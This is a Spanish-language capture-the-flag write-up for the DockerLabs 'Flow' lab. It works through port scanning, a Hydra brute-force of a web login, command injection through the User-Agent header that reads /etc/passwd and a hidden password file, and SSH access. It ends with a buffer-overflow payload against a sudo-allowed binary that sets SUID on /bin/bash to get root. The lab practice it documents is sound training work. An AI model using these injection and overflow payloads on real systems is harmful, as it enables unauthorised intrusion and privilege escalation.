---
title: Flow
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2025-02-01
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-flow/flow_logo.png
categories:
  - Docker_Labs
tags:
  - linux
  - dockerlabs
  - tcp
  - ssh
  - http
  - data_leaks
  - password_attacks
  - os_command_injection
  - reverse_engineering
  - buffer_overflow
  - information_gathering
  - web_analysis
  - data_leak_exploitation
  - vulnerability_exploitation
  - privilege_escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/flow:-$ ping -c 1 127.17.0.2
PING 127.17.0.2 (127.17.0.2) 56(84) bytes of data.
64 bytes from 127.17.0.2: icmp_seq=1 ttl=64 time=0.041 ms

--- 127.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.041/0.041/0.041/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/flow:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv 127.17.0.2 -n -Pn -oG nmap1
Host: 127.17.0.2 ()     Status: Up
Host: 127.17.0.2 ()     Ports: 22/open/tcp//ssh///, 80/open/tcp//http///        Ignored State: closed (65533)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/flow:-$ sudo nmap -sCV -p22,80 -vvv 127.17.0.2 -oN nmap2
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a4:30:b7:53:8c:cd:b3:5e:a2:7b:84:a0:e2:8b:26:de (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHiHCVEfjf7qeFCWCS4xe8uPPHmHjQucfYiQ9WscYBiCH7voggRMAuMQGe5nOTSRFyFWOG5jXMVoPhwojthclfQ=
|   256 4c:7d:75:cf:08:77:21:76:94:8f:16:22:f3:b4:d1:79 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMg+N6LzkrrlWQj2YMZaZWsAQYp3LLNw4bzfTYv6YlpN
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Login - P\xC3\xA1gina Segura
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```terminal
/home/kali/Documents/dockerlabs/flow:-$ whatweb 127.17.0.2
http://127.17.0.2 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[127.17.0.2], PasswordField[password], Title[Login - Página Segura]
```

---
## Web Analysis & Data Leak Exploitation

La web presenta un formulario de inicio de sesión.

![](assets/img/dockerlabs-writeup-flow/flow1_1.png)

Al inspeccionar el código fuente, encuentro un comentario con un nombre de usuario.

![](assets/img/dockerlabs-writeup-flow/flow1_2.png)

Utilizo Hydra para realizar un ataque de fuerza bruta sobre el formulario, empleando el usuario encontrado.

```terminal
/home/kali/Documents/dockerlabs/flow:-$ sudo hydra -l d1se0 -P /usr/share/wordlists/rockyou.txt 127.17.0.2 http-post-form "/index.php:username=^USER^&password=^PASS^&Login=Iniciar+Sesión:¡Ups\+Las+credenciales+no+son+correctas.+Intenta+nuevamente."
[80][http-post-form] host: 127.17.0.2   login: d1se0   password: amigos
```

![](assets/img/dockerlabs-writeup-flow/flow1_3.png)

Consigo acceder con las credenciales `d1se0`:`amigos`.

---
## Vulnerability Exploitation

Una vez autenticado, accedo al panel de administración en `/gestionAdminPanel.php`. A simple vista, no parece contener información relevante.

![](assets/img/dockerlabs-writeup-flow/flow2_1.png)

Sin embargo, al modificar el valor del encabezado `User-Agent`, descubro que es vulnerable a command injection.

```http
GET /gestionAdminPanel.php HTTP/1.1
User-Agent: id
```

![](assets/img/dockerlabs-writeup-flow/flow2_2.png)

Consulto el archivo `/etc/passwd` para identificar usuarios con acceso al sistema.

```http
GET /gestionAdminPanel.php HTTP/1.1
User-Agent: cat /etc/passwd | grep sh$
```

![](assets/img/dockerlabs-writeup-flow/flow2_3.png)

Busco archivos y directorios accesibles por el usuario `flow` o con permisos de escritura para otros.

```http
GET /gestionAdminPanel.php HTTP/1.1
User-Agent: find / '(' -type f -or -type d ')' '(' '(' -user flow ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/'
```

![](assets/img/dockerlabs-writeup-flow/flow2_4.png)

Encuentro el archivo `/usr/bin/secret` que podría contener información sensible.

```http
GET /gestionAdminPanel.php HTTP/1.1
User-Agent: cat /usr/bin/secret
```

![](assets/img/dockerlabs-writeup-flow/flow2_5.png)

Decodifico el contenido con Base32 y obtengo una posible contraseña.

```terminal
/home/kali/Documents/dockerlabs/flow:-$ echo 'MQYXGZJQNFZXI2DFMJSXG5CAEQSCC===' | base32 -d
d1se0isthebest@$$!
```

Uso esta contraseña para iniciar sesión en SSH con el usuario `flow`.

```terminal
/home/kali/Documents/dockerlabs/flow:-$ ssh flow@127.17.0.2
flow@127.17.0.2's password: d1se0isthebest@$$!

flow@kali:~$ id
uid=1001(flow) gid=1001(flow) groups=1001(flow),100(users)

flow@kali:~$ cat user.txt 
```

---
## Privilege Escalation

```terminal
flow@kali:~$ sudo -l
Matching Defaults entries for flow on kali:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User flow may run the following commands on kasli:
    (ALL : ALL) NOPASSWD: /usr/local/bin/manager
```

El usuario `flow` puede ejecutar `/usr/local/bin/manager` como `root` sin contraseña.

En el directorio `/tmp`, encuentro un archivo que contiene una posible clave.

```terminal
flow@kali:~$ cat /tmp/key_output.txt
key = 1234
```

Al ejecutar el binario `manager`, solicita una clave. Si la clave ingresada es incorrecta, muestra un mensaje de error indicando falta de permisos para abrir un archivo.

![](assets/img/dockerlabs-writeup-flow/flow3_1.png)

Esto sugiere que el programa intenta acceder a un archivo protegido y que la clave ingresada podría ser verificada contra algún valor interno.

Para analizar su funcionamiento, descargo el binario `manager` a mi máquina.

```terminal
flow@kali:~$ python3 -m http.server -d /usr/local/bin/
	Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

/home/kali/Documents/dockerlabs/flow:-$ wget http://127.17.0.2:8000/manager

	... 127.0.0.1 - - [02/Feb/2025 01:03:58] "GET /manager HTTP/1.1" 200 -
```

---

Dentro de la función `main`, identifico varios aspectos clave que permiten elevar privilegios.

![](assets/img/dockerlabs-writeup-flow/flow3_2.png)

* Tamaño del buffer de entrada

El programa almacena la entrada del usuario en `local_58`, que tiene un tamaño de 76 bytes. Sin embargo, `fgets()` permite leer hasta 128 bytes (0x80), lo que indica una vulnerabilidad de Buffer Overflow.

* Comprobación de autenticación

El programa compara `local_c` con `0x726f6f74`. Si el valor coincide, activa el modo administrador, escribe la clave en el archivo `/tmp/key_output.txt` y ejecuta la función `execute_command()`, que permite ejecutar comandos arbitrarios. Si no coincide, entra en el modo usuario, escribe la clave en el mismo archivo, pero solo muestra un mensaje.

* Función `execute_command()` permite ejecución arbitraria.

Esta función lee un comando de la entrada estándar y lo ejecuta con `system()`, lo que permite ejecución de comandos como `root` si logramos acceder al modo administrador.

```c
void execute_command(void) {
  char local_88 [128];
  printf("\n\x1b[32m[+] Modo administrador activado.\n\x1b[0m");
  printf("Escribe un comando: ");
  fgets(local_88,0x80,stdin);
  system(local_88);
}
```

* La clave se guarda en `/tmp/key_output.txt`.

La función `write_key_to_file()` escribe el valor de `local_c` en `/tmp/key_output.txt`.

![](assets/img/dockerlabs-writeup-flow/flow3_3.png)

Dado que `local_c` se inicializa con `0x4d2`, el archivo `/tmp/key_output.txt` contendrá la línea `1234`.

```terminal
flow@kali:~$ cat /tmp/key_output.txt
key = 1234
```

Este valor no nos da acceso al modo administrador, pero es un dato útil sobre cómo funciona el programa.

---

El programa tiene una variable `local_c` que almacena la clave utilizada en la comparación del `if`. Esta variable está declarada después del buffer de entrada `local_58`, lo que significa que un desbordamiento de buffer puede sobrescribir su valor.

* Casos sin sobreescritura de `local_c`.

> 74 'A' → key = 1234

> 75 'A' → key = 1024

> 76 'A' → key = 0

![](assets/img/dockerlabs-writeup-flow/flow3_4.png)

El buffer `local_58` tiene 76 bytes. Cuando se introduce exactamente 76 caracteres, el siguiente valor en la memoria (`local_c`) se sobrescribe con `0x00000000` (cero), lo que explica por qué `key = 0`.

* Casos donde `local_c` se sobrescribe con valores específicos.

> 77 'A' → key = 65

> 78 'A' → key = 16705

![](assets/img/dockerlabs-writeup-flow/flow3_5.png)

`A` en ASCII es `0x41` (decimal 65). Con 77 caracteres, `local_c` se sobrescribe con `0x00000041`, lo que equivale a 65 en decimal. Con 78 caracteres, `local_c` se sobrescribe con `0x00004141`, que es 16705 en decimal.

Esto confirma que estamos escribiendo directamente en la variable `local_c`, lo que nos permite controlarla.

* Control total sobre `local_c`.

> 76 'A' + 1 'B' → key = 66

![](assets/img/dockerlabs-writeup-flow/flow3_6.png)

```terminal
/home/kali/Documents/dockerlabs/flow:-$ printf "%x\n" 66 | xxd -r -p
B
```

El carácter `B` en ASCII es `0x42`, 66 en decimal. Al escribir `76 'A' + 1 'B'`, sobrescribimos`local_c` con `0x00000042`, lo que confirma que tenemos control total sobre su valor.

---

El objetivo es sobrescribir la variable `local_c` con el valor `0x726f6f74`, que es la representación en hexadecimal de "toor" en little-endian. Esto nos permitirá activar el modo administrador y ejecutar comandos como `root`.

![](assets/img/dockerlabs-writeup-flow/flow3_7.png)

```terminal
/home/kali/Documents/dockerlabs/flow:-$ printf "%x\n" 1919905652 | xxd -r -p
root
```

Confirmamos que hemos sobrescrito `local_c` con "root" correctamente.


Utilizo Python para generar la entrada maliciosa y enviarla al programa vulnerable. Y confirmo que tengo permisos elevados.

```terminal
flow@kali:~$ python3 -c 'print("A" * 76 + "\x74\x6f\x6f\x72" + "\nid\n")' | sudo /usr/local/bin/manager
```

![](assets/img/dockerlabs-writeup-flow/flow3_8.png)

Activo el bit SUID en `/bin/bash`, permitiendo ejecutar bash con privilegios de `root` sin necesidad de sudo.

```terminal
flow@kali:~$ python3 -c 'print("A" * 76 + "\x74\x6f\x6f\x72" + "\nchmod u+s /bin/bash\n")' | sudo /usr/local/bin/manager
```

```terminal
flow@kali:~$ /bin/bash -p
bash-5.2# id
uid=1001(flow) gid=1001(flow) euid=0(root) groups=1001(flow),100(users)

bash-5.2# cat /root/root.txt
```
